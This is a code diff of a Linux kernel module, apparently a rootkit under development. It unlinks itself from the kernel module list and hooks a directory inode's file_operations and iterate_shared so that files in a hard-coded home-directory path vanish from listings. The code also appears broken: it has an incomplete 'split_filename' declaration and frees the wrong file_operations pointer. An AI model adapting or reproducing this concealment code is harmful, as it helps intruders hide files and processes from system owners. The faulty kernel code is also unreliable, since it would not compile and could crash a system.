@@ -16,7 +16,7 @@ static struct list_head *modules;
 // TODO: Provide a way for the module to control the path(s).
 static const char *test_path_name = "/home/yanayg";
 static const char *test_file_name = "test_file";
-static int (*iterate_shared) (struct file *, struct dir_context *);
+//static int (*iterate_shared) (struct file *, struct dir_context *);
 
 static void hide_module(void) {
     // Save the list for later so we can add the module back in.
@@ -52,6 +52,57 @@ static int get_inode_by_path_name(const char *path_name, struct inode **inode) {
     return 0;
 }
 
+struct fops_hook {
+    struct list_head head;
+    unsigned long ino;
+    struct file_operations *prev_fops;
+};
+
+static LIST_HEAD(fops_hooks);
+
+static int create_fops_hook(struct inode *inode, struct file_operations **file_operations) {
+	struct fops_hook *fops_hook;
+
+	fops_hook = (struct fops_hook *)kmalloc(sizeof(struct fops_hook), GFP_KERNEL);
+	fops_hook->ino = inode->i_ino;
+	fops_hook->prev_fops = inode->i_fop;
+	list_add(&fops_hook->head, &fops_hooks);
+
+	*file_operations = (struct file_operations *)kmalloc(sizeof(struct file_operations), GFP_KERNEL);
+	memcpy(*file_operations, inode->i_fop, sizeof(struct file_operations));
+	inode->i_fop = *file_operations;
+	return 0;
+
+}
+
+static int free_fops_hook(struct inode *inode) {
+    struct list_head *pos;
+    struct fops_hook *entry;
+	list_for_each(pos, &fops_hooks) {
+	    entry = list_entry(pos, struct fops_hook, head);
+	    if (entry->ino == inode->i_ino) {
+	    	inode->i_fop = entry->prev_fops;
+	        list_del(&entry->head);
+	        kfree(entry->prev_fops);
+	        kfree(entry);
+	        return 0;
+	    }
+	}
+	return -1;
+}
+
+static struct fops_hook *get_fops_hook(const struct inode *inode) {
+    struct list_head *pos;
+    struct fops_hook *entry;
+	list_for_each(pos, &fops_hooks) {
+	    entry = list_entry(pos, struct fops_hook, head);
+	    if (entry->ino == inode->i_ino) {
+	        return entry;
+	    }
+	}
+	return NULL;
+}
+
 struct dir_context_hook {
     struct list_head head;
     struct dir_context *ctx;
@@ -80,33 +131,56 @@ static int new_actor(struct dir_context *ctx, const char *name, int namelen, lof
 static int new_iterate_shared(struct file *filp, struct dir_context *dir_context) {
     int res;
     struct dir_context_hook *hook;
+    struct fops_hook *fops_hook;
 	printk(KERN_INFO "Called hooked iterate!");
 	hook = (struct dir_context_hook *)kmalloc(sizeof(struct dir_context_hook), GFP_KERNEL);
 	hook->ctx = dir_context;
 	hook->prev_actor = dir_context->actor;
 	list_add(&hook->head, &dir_context_hooks);
 	dir_context->actor = new_actor;
-	res = iterate_shared(filp, dir_context);
+	fops_hook = get_fops_hook(filp->f_inode);
+	if (fops_hook == NULL) return -1;
+	res = fops_hook->prev_fops->iterate_shared(filp, dir_context);
 	if (res) {
 	    return res;
 	}
     return 0;
 }
 
-static int __init MRK_initialize(void) {
-	int retval;
+static int split_filename()
+
+static int hide_file(const char *path_name) {
+    int retval;
 	struct inode *inode;
-	// TODO: fix memory leak
-	struct file_operations *file_operations = (struct file_operations *)kmalloc(sizeof(struct file_operations), GFP_KERNEL);
-	if ((retval = get_inode_by_path_name(test_path_name, &inode))) {
+	struct file_operations *file_operations;
+
+	if ((retval = get_inode_by_path_name(path_name, &inode))) {
 	    return retval;
 	}
-	printk(KERN_INFO "Inode fop iterate: %p\n", inode->i_fop->iterate_shared);
-	memcpy(file_operations, inode->i_fop, sizeof(struct file_operations));
-	inode->i_fop = file_operations;
-	iterate_shared = file_operations->iterate_shared;
-	file_operations->iterate_shared = new_iterate_shared;
 
+	if ((retval = create_fops_hook(inode, &file_operations))) {
+	    return retval;
+	}
+
+	file_operations->iterate_shared = new_iterate_shared;
+	return 0;
+}
+
+static int unhide_file(const char *path_name) {
+    int retval;
+	struct inode *inode;
+
+	if ((retval = get_inode_by_path_name(path_name, &inode))) {
+	    return retval;
+	}
+
+	return free_fops_hook(inode);
+}
+
+static int __init MRK_initialize(void) {
+	hide_file(test_path_name);
+//	unhide_file(test_path_name);
+//	hide_file(test_path_name);
 	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
 	return 0;
